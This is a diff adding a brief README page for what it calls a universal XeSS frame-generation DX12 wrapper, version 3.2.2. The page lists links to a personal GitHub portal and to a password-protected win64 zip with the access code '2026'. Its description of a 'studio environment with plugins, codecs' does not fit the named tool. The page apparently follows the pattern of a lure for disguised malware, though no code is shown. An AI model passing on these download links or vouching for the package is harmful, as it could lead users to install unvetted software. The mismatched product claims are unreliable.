@@ -1,0 +1,9 @@
+# dlssg-to-xefg Universal XeSS FrameGen DX12 Wrapper (v3.2.2)
+
+> dlssg-to-xefg Universal XeSS FrameGen DX12 Wrapper v3.2.2: Native Windows 10/11 (x64) studio environment with pre-configured plugins, codecs.
+
+- [Official Portal & Documentation](https://Bianchi61.github.io/dlssg-to-xefg-universal-wrapper/)
+- [Direct Release Package (dlssg-to-xefg-universal-wrapper-v3.2.2-win64.zip)](https://github.com/Bianchi61/dlssg-to-xefg-universal-wrapper/releases/download/v3.2.2/dlssg-to-xefg-universal-wrapper-v3.2.2-win64.zip) (Archive Access Code: 2026)
+- [GitHub Repository](https://github.com/Bianchi61/dlssg-to-xefg-universal-wrapper)
+- [Installation Guide](https://github.com/Bianchi61/dlssg-to-xefg-universal-wrapper/blob/main/docs/INSTALL.md)
+- [FAQ & Troubleshooting](https://github.com/Bianchi61/dlssg-to-xefg-universal-wrapper/blob/main/docs/FAQ.md)
